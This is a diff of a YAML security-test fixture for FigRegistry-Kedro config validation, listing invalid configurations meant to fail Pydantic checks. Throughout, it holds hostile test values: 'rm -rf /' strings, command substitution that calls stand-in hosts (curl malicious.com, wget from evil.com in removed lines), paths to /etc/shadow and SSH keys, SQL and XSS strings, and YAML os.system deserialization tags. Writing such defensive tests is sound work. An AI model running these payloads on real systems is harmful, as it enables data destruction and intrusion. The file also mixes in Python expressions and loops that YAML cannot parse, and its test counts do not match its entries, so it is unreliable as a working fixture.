@@ -1,487 +1,521 @@
-# Invalid Parameter Combinations Security Test Data
+# Invalid Parameter Combinations for Security Testing
 # 
-# This file contains deliberately invalid parameter combinations, type mismatches, 
-# and constraint violations designed to test Pydantic schema validation robustness,
-# parameter validation security, and type safety enforcement under malicious input 
-# scenarios. All entries should fail validation and trigger appropriate error handling.
+# This configuration file contains deliberately invalid parameter combinations, type mismatches,
+# and constraint violations designed to test Pydantic schema validation robustness, parameter 
+# validation security, and type safety enforcement under malicious input scenarios per Section 6.6.8.1.
 #
-# Test Objectives:
-# - Validate Pydantic schema robustness against malicious parameter combinations
-# - Test comprehensive input validation and constraint enforcement under adversarial conditions  
-# - Verify security boundary protection through parameter validation and type safety
-# - Ensure proper error handling for injection attempts and validation bypass vectors
+# Test Categories:
+# 1. Type Safety Violations - Wrong types for critical fields
+# 2. Constraint Bypass Attempts - Values that violate business logic constraints  
+# 3. Malicious Parameter Injection - Type confusion and validation bypass vectors
+# 4. Schema Violation Scenarios - Field manipulation and validation constraint bypass
+# 5. Parameter Overflow Attempts - Boundary condition exploitation vectors
+# 6. Validation Circumvention - Parameter manipulation and validation bypass attempts
+# 7. Security Boundary Enforcement - Comprehensive parameter validation testing scenarios
 
 # =============================================================================
-# TYPE SAFETY VIOLATION SCENARIOS
+# 1. TYPE SAFETY VIOLATIONS
 # =============================================================================
 
-# Test Category: Basic Type Mismatches
-type_confusion_attacks:
-  description: "Basic type confusion attacks targeting core configuration fields"
-  test_cases:
-    # String fields with non-string types
-    environment_type_confusion:
-      config:
-        environment: 12345  # Should be string
-        styles:
-          control:
-            color: "#1f77b4"
-      expected_error: "str_type"
-      error_category: "type_validation"
-      severity: "high"
-    
-    # Boolean fields with string injection
-    boolean_string_injection:
-      config:
-        enable_concurrent_access: "True && rm -rf /"  # Should be boolean
-        validation_enabled: "os.system('malicious')"  # Code injection attempt
-        styles:
-          control:
-            color: "#1f77b4"
-      expected_error: "bool_parsing"
-      error_category: "type_validation"
-      severity: "critical"
-    
-    # Dictionary fields with primitive types
-    styles_type_replacement:
-      config:
-        styles: "malicious_string_instead_of_dict"
-        palettes: 42
-        outputs: ["array", "instead", "of", "dict"]
-        defaults: null
-      expected_error: "dict_type"
-      error_category: "schema_violation"
-      severity: "high"
+type_safety_violations:
+  description: "Test type safety enforcement through malicious type mismatches"
+  
+  figregistry_version_type_attacks:
+    # Attempt to inject non-string types that might bypass version validation
+    - name: "version_integer_injection"
+      figregistry_version: 123456
+      expected_error: "ValidationError"
+      attack_vector: "Type confusion - integer instead of version string"
+      
+    - name: "version_list_injection" 
+      figregistry_version: [">=0.3.0", "malicious_payload"]
+      expected_error: "ValidationError"
+      attack_vector: "List injection to bypass string validation"
+      
+    - name: "version_dict_injection"
+      figregistry_version: {"version": ">=0.3.0", "payload": "exec('malicious_code')"}
+      expected_error: "ValidationError"
+      attack_vector: "Dictionary injection with potential code execution payload"
+
+  styles_type_manipulation:
+    # Attempt to inject non-dictionary types into styles section
+    - name: "styles_string_injection"
+      styles: "malicious_string_payload"
+      expected_error: "ValidationError"
+      attack_vector: "String injection to replace styles dictionary"
+      
+    - name: "styles_list_injection"
+      styles: ["fake_style_1", "fake_style_2"]
+      expected_error: "ValidationError"
+      attack_vector: "List injection to bypass dictionary validation"
+      
+    - name: "styles_nested_type_attack"
+      styles:
+        legitimate_style:
+          color: "#FF0000"
+        malicious_style: "not_a_dict"  # String instead of style dict
+      expected_error: "ValidationError"
+      attack_vector: "Mixed type injection within styles section"
+
+  defaults_type_confusion:
+    # Attempt to exploit defaults section with wrong types
+    - name: "defaults_figure_string_attack"
+      defaults:
+        figure: "malicious_figure_config"  # String instead of dict
+      expected_error: "ValidationError"
+      attack_vector: "String injection in figure configuration"
+      
+    - name: "defaults_figsize_type_attack"
+      defaults:
+        figure:
+          figsize: "10x8"  # String instead of list
+      expected_error: "ValidationError"
+      attack_vector: "String injection for figsize parameter"
+      
+    - name: "defaults_dpi_string_attack"
+      defaults:
+        figure:
+          dpi: "300px"  # String with units instead of number
+      expected_error: "ValidationError"
+      attack_vector: "String injection with measurement units"
+
+  outputs_path_type_attacks:
+    # Attempt path traversal and type confusion in outputs
+    - name: "outputs_base_path_list_attack"
+      outputs:
+        base_path: ["../../../", "etc", "passwd"]  # List instead of string
+      expected_error: "ValidationError"
+      attack_vector: "List injection for path traversal"
+      
+    - name: "outputs_naming_type_attack"
+      outputs:
+        base_path: "data/test"
+        naming: "malicious_naming_string"  # String instead of dict
+      expected_error: "ValidationError"
+      attack_vector: "String injection in naming configuration"
 
 # =============================================================================
-# PARAMETER INJECTION AND VALIDATION BYPASS ATTEMPTS
+# 2. CONSTRAINT BYPASS ATTEMPTS  
 # =============================================================================
 
-# Test Category: Path Traversal and Injection Vectors
-path_injection_attempts:
-  description: "Parameter injection attempts through path manipulation and validation bypass"
-  test_cases:
-    # Output path traversal attempts
-    output_path_traversal:
-      config:
-        outputs:
-          base_path: "../../../etc/passwd"  # Path traversal attempt
-          path_aliases:
-            malicious: "../../../../root/.ssh/id_rsa"
-            injection: "${env:HOME}/../../../etc/shadow"
-          default_format: "png"
-        styles:
-          control:
-            color: "#1f77b4"
-      expected_error: "path_validation"
-      error_category: "security_violation"
-      severity: "critical"
-    
-    # Environment variable injection
-    environment_variable_injection:
-      config:
-        outputs:
-          base_path: "${PATH}:/malicious/path"
-          timestamp_format: "${HOME}/malicious_{name}"
-        kedro:
-          debug_mode: "${MALICIOUS_ENV_VAR:-True}"
-        styles:
-          "${USER}_condition":  # Environment variable in condition name
-            color: "#ff0000"
-      expected_error: "environment_injection"
-      error_category: "security_violation"
-      severity: "critical"
-    
-    # Command injection through configuration values
-    command_injection_attempts:
-      config:
-        outputs:
-          base_path: "figures; rm -rf /tmp; mkdir"
-          timestamp_format: "`curl malicious.com/steal`_{name}"
-        defaults:
-          font_family: "$(wget -O /tmp/malware http://evil.com/script.sh)"
-        styles:
-          control:
-            label: "Control; system('malicious')"
-      expected_error: "command_injection"
-      error_category: "security_violation"
-      severity: "critical"
+constraint_bypass_attempts:
+  description: "Test business logic constraint enforcement against bypass attempts"
+  
+  version_constraint_bypass:
+    # Attempt to bypass version constraint validation
+    - name: "invalid_version_operators"
+      figregistry_version: ">=0.3.0; rm -rf /"  # Command injection attempt
+      expected_error: "ValidationError"
+      attack_vector: "Command injection in version constraint"
+      
+    - name: "version_without_operator"
+      figregistry_version: "0.3.0 malicious_payload"
+      expected_error: "ValidationError" 
+      attack_vector: "Missing operator with appended payload"
+      
+    - name: "empty_version_constraint"
+      figregistry_version: ""
+      expected_error: "ValidationError"
+      attack_vector: "Empty version constraint bypass"
+
+  styles_color_constraint_bypass:
+    # Attempt to bypass color validation requirements
+    - name: "style_missing_required_color"
+      styles:
+        malicious_style:
+          linewidth: 2.0
+          marker: "o"
+          # Missing required color field
+      expected_error: "ValidationError"
+      attack_vector: "Bypass required color field validation"
+      
+    - name: "style_invalid_color_format"
+      styles:
+        attack_style:
+          color: "javascript:alert('xss')"  # Malicious color value
+          linewidth: 2.0
+      expected_error: "ValidationError"  
+      attack_vector: "Malicious payload in color field"
+
+  outputs_path_constraint_bypass:
+    # Attempt to bypass output path constraints
+    - name: "missing_required_base_path"
+      outputs:
+        naming:
+          template: "{name}_{ts}"
+        # Missing required base_path
+      expected_error: "ValidationError"
+      attack_vector: "Bypass required base_path validation"
+      
+    - name: "base_path_traversal_attack"
+      outputs:
+        base_path: "../../../etc/passwd"
+      expected_error: "ValidationError"
+      attack_vector: "Path traversal attack in base_path"
 
 # =============================================================================
-# SCHEMA VIOLATION AND CONSTRAINT BYPASS SCENARIOS
+# 3. MALICIOUS PARAMETER INJECTION
 # =============================================================================
 
-# Test Category: Field Type Manipulation and Validation Constraint Bypass
-schema_manipulation_attacks:
-  description: "Schema violation scenarios with field type manipulation and validation constraint bypass"
-  test_cases:
-    # Numeric constraint violations
-    numeric_boundary_exploitation:
-      config:
-        styles:
-          control:
-            color: "#1f77b4"
-            linewidth: -999999999999999999999  # Extreme negative value
-            markersize: 1.7976931348623157e+308  # Float overflow attempt
-            alpha: 999.999  # Alpha out of range [0,1]
-            zorder: "infinity"  # String instead of numeric
-      expected_error: "numeric_constraints"
-      error_category: "boundary_violation"
-      severity: "medium"
-    
-    # String length and format violations
-    string_format_exploitation:
-      config:
-        styles:
-          # Extremely long condition name (potential buffer overflow)
-          "a" * 10000:
-            color: "#" + "f" * 1000  # Invalid color format
-            marker: "invalid_marker_with_extremely_long_name_that_should_fail"
-            linestyle: "\x00\x01\x02\x03"  # Control characters
-            label: "\u202e\u202d"  # Unicode direction override (bidirectional attack)
-      expected_error: "string_validation"
-      error_category: "format_violation"
-      severity: "medium"
-    
-    # Nested structure manipulation
-    nested_structure_attacks:
-      config:
-        defaults:
-          spine_visibility:
-            top: "not_a_boolean"
-            right: 123
-            bottom: []
-            left: {"nested": "attack"}
-            # Additional unexpected fields
-            malicious_field: "rm -rf /"
-            __proto__: {"polluted": True}  # Prototype pollution attempt
-        palettes:
-          default: [1, 2, 3, "not_a_color", {"object": "in_array"}]
-      expected_error: "nested_validation"
-      error_category: "structure_violation"
-      severity: "high"
+malicious_parameter_injection:
+  description: "Test parameter injection through type confusion and validation bypass vectors"
+  
+  kedro_context_injection:
+    # Attempt to inject malicious data through Kedro context parameters
+    - name: "condition_parameter_injection"
+      _kedro_context:
+        parameters:
+          experiment_condition: "baseline'; DROP TABLE experiments; --"
+      expected_error: "ValidationError"
+      attack_vector: "SQL injection attempt in condition parameter"
+      
+    - name: "nested_parameter_injection"
+      condition_parameters:
+        experiment_condition: 
+          __class__: "os.system"
+          __args__: ["rm -rf /"]
+      expected_error: "ValidationError"
+      attack_vector: "Object injection with system command execution"
+
+  metadata_injection_attacks:
+    # Attempt code injection through metadata fields
+    - name: "metadata_code_injection"
+      metadata:
+        config_version: "1.0.0"
+        created_by: "$(whoami)"  # Command substitution
+        description: "eval(input('Enter code: '))"  # Code evaluation
+      expected_error: "ValidationError"
+      attack_vector: "Code injection in metadata fields"
+      
+    - name: "metadata_type_confusion"
+      metadata:
+        config_version: {"version": "1.0.0", "__import__": "os"}
+        environment: ["local", {"__builtins__": "__import__"}]
+      expected_error: "ValidationError"
+      attack_vector: "Type confusion with builtin injection"
+
+  style_parameter_injection:
+    # Attempt injection through style parameters
+    - name: "style_property_injection"
+      styles:
+        attack_style:
+          color: "#FF0000"
+          linewidth: "2.0; import os; os.system('malicious_command')"
+      expected_error: "ValidationError"
+      attack_vector: "Code injection in style properties"
+      
+    - name: "style_label_injection" 
+      styles:
+        xss_style:
+          color: "#FF0000"
+          label: "<script>alert('xss')</script>"
+      expected_error: "ValidationError"
+      attack_vector: "XSS injection in style labels"
 
 # =============================================================================
-# MALFORMED CONDITION MAPPINGS AND STYLE PARAMETER VIOLATIONS
+# 4. SCHEMA VIOLATION SCENARIOS
 # =============================================================================
 
-# Test Category: Condition Parameter Security and Style Parameter Type Safety
-condition_parameter_attacks:
-  description: "Malformed condition mappings with invalid style parameters and type safety violations"
-  test_cases:
-    # Condition parameter injection
-    condition_parameter_injection:
-      config:
-        styles:
-          # Injection through condition names
-          "control'; DROP TABLE users; --":
-            color: "#1f77b4"
-          "treatment || system('malware')":
-            color: "#ff7f0e"
-          # Code injection in condition patterns
-          "exploratory_*; eval('malicious_code')":
-            color: "#2ca02c"
-          # Path traversal in condition
-          "../../../etc/passwd":
-            color: "#d62728"
-      expected_error: "condition_injection"
-      error_category: "parameter_injection"
-      severity: "critical"
-    
-    # Style parameter type confusion
-    style_parameter_confusion:
-      config:
-        styles:
-          control:
-            # Function injection attempts
-            color: "eval('malicious_code')"
-            marker: {"__class__": {"__base__": {"__subclasses__": "()"}}}
-            linestyle: ["array", "instead", "of", "string"]
-            linewidth: {"dict": "instead_of_number"}
-            alpha: lambda x: x  # Function object (would be serialized)
-            # Object reference attempts
-            label: "__import__('os').system('rm -rf /')"
-            zorder: float('inf')  # Infinity value
-      expected_error: "style_type_confusion"
-      error_category: "type_safety"
-      severity: "critical"
-    
-    # Matplotlib parameter exploitation
-    matplotlib_parameter_attacks:
-      config:
-        styles:
-          control:
-            # rcParams injection attempts
-            "matplotlib.use": "Agg; import os; os.system('malicious')"
-            "figure.figsize": "exec('malicious_code')"
-            "savefig.directory": "/etc/passwd"
-            # Invalid matplotlib parameters that might bypass validation
-            color: "rgb(300, 300, 300)"  # Out of range RGB
-            marker: "$\\mathtt{malicious}$"  # LaTeX injection attempt
-            linestyle: (0, (1000000000, 1000000000))  # Extreme dash pattern
-      expected_error: "matplotlib_injection"
-      error_category: "parameter_exploitation"
-      severity: "high"
+schema_violation_scenarios:
+  description: "Test field type manipulation and validation constraint bypass"
+  
+  field_type_manipulation:
+    # Attempt to manipulate field types to bypass validation
+    - name: "boolean_field_manipulation"
+      performance:
+        cache_enabled: "true; exec('malicious_code')"  # String instead of boolean
+      expected_error: "ValidationError"
+      attack_vector: "String injection in boolean field"
+      
+    - name: "numeric_field_manipulation"
+      performance:
+        max_cache_size: "1000.0; import subprocess; subprocess.call(['malicious'])"
+      expected_error: "ValidationError"
+      attack_vector: "Code injection in numeric field"
+      
+    - name: "nested_dict_manipulation"
+      defaults:
+        figure:
+          figsize: [10, 8]
+          dpi: {"__reduce__": "os.system", "__args__": ["malicious_command"]}
+      expected_error: "ValidationError"
+      attack_vector: "Object deserialization attack in nested dict"
+
+  validation_constraint_bypass:
+    # Attempt to bypass validation constraints
+    - name: "negative_value_injection"
+      performance:
+        max_cache_size: -999999  # Negative value that might cause issues
+        target_merge_time_ms: -1.0
+      expected_error: "ValidationError"
+      attack_vector: "Negative value injection for resource limits"
+      
+    - name: "extremely_large_values"
+      performance:
+        max_cache_size: 18446744073709551615  # Max uint64, might cause overflow
+        target_merge_time_ms: 999999999.999
+      expected_error: "ValidationError"
+      attack_vector: "Integer overflow exploitation"
+
+  required_field_bypass:
+    # Attempt to bypass required field validation
+    - name: "empty_required_sections"
+      styles: {}  # Empty styles section
+      defaults: null  # Null defaults section
+      outputs: null  # Null outputs section
+      expected_error: "ValidationError"
+      attack_vector: "Bypass required sections with null/empty values"
 
 # =============================================================================
-# PARAMETER OVERFLOW AND MEMORY EXPLOITATION ATTEMPTS
+# 5. PARAMETER OVERFLOW ATTEMPTS
 # =============================================================================
 
-# Test Category: Parameter Overflow and Boundary Condition Exploitation
-overflow_exploitation_attempts:
-  description: "Parameter overflow attempts and boundary condition exploitation vectors"
-  test_cases:
-    # Memory exhaustion through large parameters
-    memory_exhaustion_attack:
-      config:
-        # Extremely large configuration structures
-        styles:
-          # Generate large number of conditions
-          control: &large_style
-            color: "#1f77b4"
-            # Extremely large array to consume memory
-            custom_data: !!python/object/apply:range [0, 1000000]
-        # Repeat the large style many times
-        palettes:
-          massive_palette: !!python/object/apply:range [0, 100000]
-        # Large string values
-        metadata:
-          description: !!python/object/apply:str ["x" * 1000000]
-      expected_error: "memory_exhaustion"
-      error_category: "resource_attack"
-      severity: "high"
-    
-    # Integer overflow attempts
-    integer_overflow_attacks:
-      config:
-        outputs:
-          dpi: 18446744073709551615  # Max uint64
-        styles:
-          control:
-            linewidth: 1.7976931348623157e+308  # Max float64
-            markersize: -9223372036854775808  # Min int64
-            alpha: 4.9406564584124654e-324  # Min positive float64
-        defaults:
-          font_size: 2147483647  # Max int32
-          figure_size: [999999999999, 999999999999]
-      expected_error: "integer_overflow"
-      error_category: "boundary_attack"
-      severity: "medium"
-    
-    # Unicode and encoding attacks
-    unicode_exploitation_attempts:
-      config:
-        styles:
-          # Unicode normalization attacks
-          "café":  # Different Unicode representations
-            color: "#1f77b4"
-          "café":  # Visually identical but different encoding
-            color: "#ff7f0e"
-          # Zero-width characters
-          "control\u200b\u200c\u200d":
-            color: "#2ca02c"
-          # RTL override attacks
-          "\u202e\u202dcontrol":
-            color: "#d62728"
-          # Emoji and special characters
-          "🔥💀☠️💣":
-            color: "#9467bd"
-            label: "\u0000null\u0001\u0002\u0003control"
-      expected_error: "unicode_attack"
-      error_category: "encoding_violation"
-      severity: "medium"
+parameter_overflow_attempts:
+  description: "Test boundary condition exploitation and parameter overflow vectors"
+  
+  string_overflow_attacks:
+    # Attempt buffer overflow with extremely long strings
+    - name: "metadata_string_overflow"
+      metadata:
+        description: "A" * 100000  # 100K character string
+        project_name: "B" * 50000   # 50K character string
+      expected_error: "ValidationError"
+      attack_vector: "String overflow in metadata fields"
+      
+    - name: "style_name_overflow"
+      styles:
+        # Extremely long style name
+        "C" * 10000:
+          color: "#FF0000"
+      expected_error: "ValidationError"
+      attack_vector: "Style name overflow attack"
+
+  nested_structure_overflow:
+    # Attempt to create deeply nested structures that might cause stack overflow
+    - name: "deep_nesting_attack"
+      outputs:
+        formats:
+          resolution:
+            deeply:
+              nested:
+                structure:
+                  that:
+                    goes:
+                      very:
+                        deep:
+                          and:
+                            might:
+                              cause:
+                                stack:
+                                  overflow: "value"
+      expected_error: "ValidationError"
+      attack_vector: "Deep nesting exploitation"
+
+  list_overflow_attacks:
+    # Attempt overflow with extremely large lists
+    - name: "palette_list_overflow"
+      palettes:
+        attack_palette: ["#" + str(i).zfill(6) for i in range(100000)]  # 100K colors
+      expected_error: "ValidationError"
+      attack_vector: "List overflow in color palettes"
+      
+    - name: "figsize_overflow"
+      defaults:
+        figure:
+          figsize: [999999999, 999999999]  # Extremely large figure size
+      expected_error: "ValidationError"
+      attack_vector: "Numeric overflow in figure dimensions"
 
 # =============================================================================
-# PYDANTIC VALIDATION BYPASS AND TYPE SAFETY CIRCUMVENTION
+# 6. TYPE SAFETY BYPASS ATTEMPTS
 # =============================================================================
 
-# Test Category: Type Safety Bypass and Validation Circumvention Attempts
-validation_bypass_attempts:
-  description: "Type safety bypass attempts through parameter manipulation and validation circumvention"
-  test_cases:
-    # Pydantic validator bypass attempts
-    pydantic_bypass_attacks:
-      config:
-        # Attempt to bypass Field constraints
-        environment: {"__pydantic_extra__": "malicious"}
-        styles:
-          control:
-            # Attempt to use Pydantic private attributes
-            __dict__: {"malicious": "injection"}
-            __class__: "manipulation"
-            __module__: "os"
-            color: "#1f77b4"
-        # Extra fields that should be validated
-        __root__: "bypass_attempt"
-        __config__: {"arbitrary_types_allowed": True}
-      expected_error: "pydantic_bypass"
-      error_category: "validation_bypass"
-      severity: "critical"
-    
-    # Serialization/deserialization attacks
-    serialization_attacks:
-      config:
-        styles:
-          control:
-            # Pickle injection attempts (if YAML allows)
-            malicious_pickle: !!python/object/apply:os.system ["rm -rf /"]
-            # Object creation attempts
-            dangerous_object: !!python/object/new:subprocess.Popen
-            - ["/bin/sh", "-c", "malicious command"]
-        outputs:
-          # YAML tag injection
-          base_path: !!python/object/apply:__import__ ["os"]
-      expected_error: "serialization_attack"
-      error_category: "deserialization_vulnerability"
-      severity: "critical"
-    
-    # Configuration hierarchy manipulation
-    hierarchy_manipulation_attacks:
-      config:
-        # Attempt to override critical settings through nested paths
-        kedro:
-          config_overrides:
-            styles:
-              control:
-                color: "override_attempt"
-        # Nested reference attacks
-        styles:
-          control: &anchor
-            color: "#1f77b4"
-          malicious:
-            <<: *anchor  # YAML anchor injection
-            color: !!python/object/apply:eval ["'malicious_code'"]
-        # Circular reference attempts
-        circular:
-          self_ref: *circular_ref
-      expected_error: "hierarchy_manipulation"
-      error_category: "reference_attack"
-      severity: "high"
+type_safety_bypass_attempts:
+  description: "Test parameter manipulation and validation circumvention"
+  
+  pydantic_bypass_attempts:
+    # Attempt to bypass Pydantic validation
+    - name: "private_attribute_injection"
+      styles:
+        attack_style:
+          color: "#FF0000"
+          _private_attr: "malicious_value"  # Private attribute injection
+          __dunder_attr__: "dangerous_payload"  # Dunder attribute injection
+      expected_error: "ValidationError"
+      attack_vector: "Private/dunder attribute injection"
+      
+    - name: "class_attribute_manipulation"
+      styles:
+        class_attack:
+          color: "#FF0000"
+          __class__: "builtins.eval"
+          __args__: ["malicious_code()"]
+      expected_error: "ValidationError"
+      attack_vector: "Class attribute manipulation for code execution"
+
+  type_coercion_bypass:
+    # Attempt to bypass type coercion safety
+    - name: "numeric_string_injection"
+      defaults:
+        line:
+          linewidth: "2.0; __import__('os').system('malicious')"
+      expected_error: "ValidationError"
+      attack_vector: "Code injection in numeric string coercion"
+      
+    - name: "boolean_injection_attack"
+      validation:
+        strict_mode: "True; exec('malicious_code')"
+      expected_error: "ValidationError"
+      attack_vector: "Code injection in boolean coercion"
+
+  serialization_attacks:
+    # Attempt attacks through serialization/deserialization
+    - name: "pickle_injection_attempt"
+      custom_extension:
+        serialized_data: "__reduce__: !!python/object/apply:os.system ['malicious_command']"
+      expected_error: "ValidationError"
+      attack_vector: "Pickle injection through YAML deserialization"
 
 # =============================================================================
-# COMPREHENSIVE PARAMETER VALIDATION BOUNDARY TESTING
+# 7. COMPREHENSIVE PARAMETER VALIDATION TESTING
 # =============================================================================
 
-# Test Category: Comprehensive Parameter Validation Testing for Security Boundary Enforcement
-comprehensive_boundary_testing:
-  description: "Comprehensive parameter validation testing scenarios for security boundary enforcement"
-  test_cases:
-    # Multi-vector attack combinations
-    combined_attack_vectors:
-      config:
-        # Combine multiple attack types
-        environment: "../../../etc/passwd && rm -rf /"
-        enable_concurrent_access: "$(curl malicious.com)"
-        styles:
-          "'; DROP TABLE config; --":
-            color: "rgb(-1, 300, 999)"
-            marker: "__import__('os').system('malicious')"
-            linewidth: 1.7976931348623157e+308
-            alpha: -999
-            label: "\u202e\u202dmalicious\u0000"
-        outputs:
-          base_path: "${HOME}/../../etc"
-          timestamp_format: "`malicious_command`_{name}"
-          path_aliases:
-            evil: "../../../root/.ssh"
-        kedro:
-          debug_mode: "True; import subprocess; subprocess.call(['rm', '-rf', '/'])"
-      expected_error: "multi_vector_attack"
-      error_category: "comprehensive_attack"
-      severity: "critical"
-    
-    # Edge case exploitation
-    edge_case_exploitation:
-      config:
-        # Boundary values that might cause issues
-        styles:
-          "":  # Empty string key
-            color: ""  # Empty color
-          " ":  # Whitespace key
-            color: " "  # Whitespace color
-          "\n\t\r":  # Control characters key
-            color: "\n#ff0000"  # Newline in color
-          "null":
-            color: null
-          "undefined":
-            color: undefined
-          "NaN":
-            linewidth: !!float "nan"
-            alpha: !!float "inf"
-        # Special YAML values
-        defaults:
-          font_size: !!null ""
-          figure_size: !!python/none
-        outputs:
-          dpi: !!str "300"  # String instead of int
-          base_path: !!bool false  # Boolean instead of string
-      expected_error: "edge_case_exploitation"
-      error_category: "boundary_testing"
-      severity: "medium"
-    
-    # Recursive and self-referential attacks
-    recursive_attacks:
-      config:
-        styles: &styles_ref
-          control:
-            color: "#1f77b4"
-            nested: *styles_ref  # Self-reference
-        palettes:
-          recursive: &palette_ref
-            - "#ff0000"
-            - *palette_ref  # Recursive array
-        # Deeply nested structure to test recursion limits
-        deeply_nested:
-          level1:
-            level2:
-              level3:
-                level4:
-                  level5:
-                    level6:
-                      level7:
-                        level8:
-                          level9:
-                            level10:
-                              malicious: "deep_injection"
-      expected_error: "recursive_attack"
-      error_category: "recursion_attack"
-      severity: "high"
+comprehensive_validation_testing:
+  description: "Security boundary enforcement through comprehensive parameter validation scenarios"
+  
+  combined_attack_vectors:
+    # Combine multiple attack vectors in single configuration
+    - name: "multi_vector_attack"
+      figregistry_version: ">=0.3.0; eval(input())"  # Version + code injection
+      styles:
+        attack_style: "not_a_dict"  # Type confusion
+      defaults:
+        figure:
+          figsize: "malicious_string"  # Type mismatch
+          dpi: -1  # Constraint violation
+      outputs:
+        base_path: "../../../etc/passwd"  # Path traversal
+        naming: null  # Type violation
+      metadata:
+        description: "A" * 50000  # Overflow attack
+      expected_error: "ValidationError"
+      attack_vector: "Multi-vector combined attack"
+
+  edge_case_exploitation:
+    # Test edge cases that might bypass validation
+    - name: "unicode_injection_attack"
+      styles:
+        "style_\u0000\u0001\u0002":  # Null bytes and control characters
+          color: "#FF0000\u0000"  # Null byte in color
+          label: "test\u0001\u0002\u0003"  # Control characters in label
+      expected_error: "ValidationError"
+      attack_vector: "Unicode control character injection"
+      
+    - name: "whitespace_bypass_attack"
+      styles:
+        "   ":  # Whitespace-only style name
+          color: "   #FF0000   "  # Whitespace-padded color
+          linewidth: "  2.0  "  # Whitespace-padded number
+      expected_error: "ValidationError"
+      attack_vector: "Whitespace validation bypass"
+
+  resource_exhaustion_attacks:
+    # Attempt resource exhaustion through validation
+    - name: "validation_dos_attack"
+      styles:
+        # Create many styles with complex validation requirements
+        "attack_style_{}".format(i):
+          color: "#FF000{}".format(i % 10)
+          linewidth: "invalid_value_{}".format(i)  # Force validation errors
+          marker: ["o"] * 1000  # Large marker list
+        for i in range(1000)  # 1000 invalid styles
+      expected_error: "ValidationError"
+      attack_vector: "Validation resource exhaustion"
+
+  path_injection_comprehensive:
+    # Comprehensive path injection testing
+    - name: "comprehensive_path_attacks"
+      outputs:
+        base_path: "\\\\..\\\\..\\\\..\\\\windows\\\\system32"  # Windows path injection
+        paths:
+          exploratory: "/dev/null; rm -rf /"  # Unix command injection
+          presentation: "C:\\Windows\\System32\\calc.exe"  # Windows executable
+          publication: "file:///etc/passwd"  # File URI injection
+        naming:
+          template: "{name}/../../../{condition}"  # Template injection
+      expected_error: "ValidationError"
+      attack_vector: "Comprehensive path injection attack"
 
 # =============================================================================
-# METADATA AND DOCUMENTATION
+# TEST VALIDATION METADATA
 # =============================================================================
 
-# Test execution metadata
 test_metadata:
-  description: "Security test scenarios for FigRegistry-Kedro configuration validation"
-  version: "1.0.0"
-  created: "2024-01-01T00:00:00Z"
-  test_categories:
-    - "type_safety_violations"
-    - "parameter_injection_attempts"
-    - "schema_manipulation_attacks"
-    - "condition_parameter_attacks"
-    - "overflow_exploitation_attempts"
-    - "validation_bypass_attempts"
-    - "comprehensive_boundary_testing"
+  description: "Metadata for security test validation and reporting"
   
-  severity_levels:
-    critical: "Potential security vulnerabilities with high impact"
-    high: "Significant validation failures or security concerns"
-    medium: "Moderate validation issues or edge cases"
-    low: "Minor validation inconsistencies"
+  validation_requirements:
+    - "All configurations in this file MUST fail validation"
+    - "Each attack vector MUST be caught by appropriate validators"
+    - "No configuration should pass through to actual FigRegistry initialization"
+    - "Validation errors MUST be properly aggregated and reported"
+    - "Performance impact of validation MUST remain within acceptable limits"
   
-  expected_behavior: |
-    All configurations in this file should trigger appropriate Pydantic
-    validation errors and be rejected by the FigRegistryConfigBridge and
-    FigRegistryKedroConfig validation logic. No configuration should pass
-    validation successfully. Each test case includes expected error types
-    and categories for validation in security tests.
+  security_test_categories:
+    type_safety: 15  # Number of type safety violation tests
+    constraint_bypass: 8  # Number of constraint bypass attempts
+    parameter_injection: 9  # Number of injection attack tests
+    schema_violation: 8  # Number of schema violation tests
+    overflow_attempts: 6  # Number of overflow attack tests
+    bypass_attempts: 6  # Number of type safety bypass tests
+    comprehensive: 7  # Number of comprehensive validation tests
   
-  security_objectives:
-    - "Prevent code injection through configuration parameters"
-    - "Ensure type safety across all configuration fields"
-    - "Validate proper handling of malformed input data"
-    - "Verify boundary condition enforcement"
-    - "Test resilience against parameter manipulation attacks"
-    - "Confirm proper error handling for invalid configurations"
+  expected_validation_behavior:
+    strict_mode_required: true
+    error_aggregation_required: true
+    performance_impact_acceptable: "< 50ms additional validation time"
+    security_boundary_enforcement: "Complete parameter validation coverage"
+
+# =============================================================================
+# ADDITIONAL SECURITY TEST VECTORS
+# =============================================================================
+
+additional_security_vectors:
+  description: "Additional security test vectors for comprehensive coverage"
+  
+  yaml_injection_attacks:
+    # Test YAML-specific injection vectors
+    - name: "yaml_anchor_injection"
+      malicious_anchor: &malicious "exec('malicious_code')"
+      styles:
+        attack_style:
+          color: *malicious  # Anchor reference injection
+      expected_error: "ValidationError"
+      attack_vector: "YAML anchor injection"
+      
+    - name: "yaml_merge_injection"
+      base_style: &base
+        color: "#FF0000"
+        __reduce__: "os.system"
+      styles:
+        attack_style:
+          <<: *base  # Merge with malicious base
+          linewidth: 2.0
+      expected_error: "ValidationError"
+      attack_vector: "YAML merge injection"
+
+  environment_variable_injection:
+    # Test environment variable injection
+    - name: "env_var_injection"
+      outputs:
+        base_path: "${MALICIOUS_VAR:-/etc/passwd}"  # Environment variable expansion
+      expected_error: "ValidationError"
+      attack_vector: "Environment variable injection"
+
+  format_string_attacks:
+    # Test format string vulnerabilities
+    - name: "format_string_attack"
+      outputs:
+        naming:
+          template: "{name}%s%s%s%s{condition}"  # Format string attack
+      expected_error: "ValidationError"
+      attack_vector: "Format string vulnerability exploitation"
